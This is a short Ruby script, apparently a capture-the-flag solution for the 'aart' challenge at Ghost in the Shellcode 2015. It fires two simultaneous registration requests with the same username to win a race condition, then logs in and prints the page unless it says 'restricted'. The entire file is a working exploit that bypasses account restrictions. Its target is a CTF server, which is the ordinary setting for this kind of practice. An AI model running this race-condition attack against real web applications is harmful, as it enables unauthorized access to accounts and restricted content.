require 'httparty'

TARGET = "http://aart.2015.ghostintheshellcode.com/"
#TARGET = "http://192.168.42.120/"

name = "ron" + rand(100000).to_s(16)

id = fork()

t1 = Thread.new do |t|
  response = (HTTParty.post("#{TARGET}/register.php", :body => { :username => name, :password => name }))
end

t2 = Thread.new do |t|
  response = (HTTParty.post("#{TARGET}/register.php", :body => { :username => name, :password => name }))
end

t1.join
t2.join

response = (HTTParty.post("#{TARGET}/login.php", :body => { :username => name, :password => name }))

if(response.body =~ /restricted/)
  puts("FAIL")
else
  puts(response.body)
end

